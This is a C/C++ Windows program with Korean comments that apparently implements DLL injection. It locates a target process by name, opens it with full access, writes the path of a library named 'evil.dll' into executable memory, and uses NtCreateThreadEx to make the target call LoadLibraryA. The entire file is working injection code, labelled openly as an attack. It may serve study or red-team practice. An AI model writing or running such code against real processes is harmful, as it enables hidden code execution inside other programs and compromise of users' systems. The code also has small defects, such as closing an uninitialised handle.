#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>
#include <vector>

#pragma comment(lib, "advapi32.lib") 

// pNtCreateThreadEx는 헤더에서 받아오는 함수가 아니라 ntdll.dll에서 로드하여 가져와 함수 포인터로 사용.
typedef NTSTATUS(NTAPI* pNtCreateThreadEx) (
    OUT PHANDLE hThread,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN PVOID lpStartAddress,
    IN PVOID lpParameter,
    IN ULONG Flags,
    IN SIZE_T StackZeroBits,
    IN SIZE_T SizeOfStackCommit,    
    IN SIZE_T SizeOfStackReserve,
    OUT PVOID lpBytesBuffer
    );

// PID 얻기
int findMyProc(const char* procname) {

    HANDLE hSnapshot;
    PROCESSENTRY32 pe;
    int pid = 0;
    BOOL hResult;

    // 시스템 내 모든 프로세스 스냅샷
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

    // Process32First()가 필요한 만큼의 사이즈 초기화. 그리고 그중 첫번째 프로세스 hResult
    pe.dwSize = sizeof(PROCESSENTRY32);
    hResult = Process32First(hSnapshot, &pe);

    //프로세스 정보 검색. . .
    while (hResult) {
        // 만약 pid찾았다면 보여줄거임
        if (strcmp(procname, pe.szExeFile) == 0) {
            pid = pe.th32ProcessID;
            break;
        }
        hResult = Process32Next(hSnapshot, &pe);
    }

    CloseHandle(hSnapshot);
    return pid;
}

int main(int argc, char* argv[]) {
    DWORD pid = 0; 
    HANDLE ph; 
    HANDLE ht; 
    LPVOID rb; 
    SIZE_T rl; // return length

    char evilDll[] = "evil.dll";
    int evilLen = sizeof(evilDll) + 1;

    HMODULE hKernel32 = GetModuleHandle("Kernel32");
    LPTHREAD_START_ROUTINE lb = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryA");
    pNtCreateThreadEx ntCTEx = (pNtCreateThreadEx)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");

    if (ntCTEx == NULL) {
        CloseHandle(ph);
        printf("NtCreateThreadEx 실패!\n");
        return -2;
    }

    pid = findMyProc(argv[1]);
    if (pid == 0) {
        printf("PID NOT FOUND \n");
        return -1;
    }
    else {
        printf("PID = %d\n", pid);

        ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);

        if (ph == NULL) {
            printf("OpenProcess 실패! \n");
            return -2;
        }

        rb = VirtualAllocEx(ph, NULL, evilLen, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        WriteProcessMemory(ph, rb, evilDll, evilLen, &rl); // NULL);

        ntCTEx(&ht, 0x1FFFFF, NULL, ph, (LPTHREAD_START_ROUTINE)lb, rb, FALSE, NULL, NULL, NULL, NULL);

        if (ht == NULL) {
            CloseHandle(ph);
            printf("ThreadHandle 실패! \n");
            return -2;
        }
        else {
            printf("NtCreateThreadEx 성공! INJECTION! \n");
        }

        WaitForSingleObject(ht, INFINITE);

        CloseHandle(ht);
        CloseHandle(ph);
    }
    return 0;
}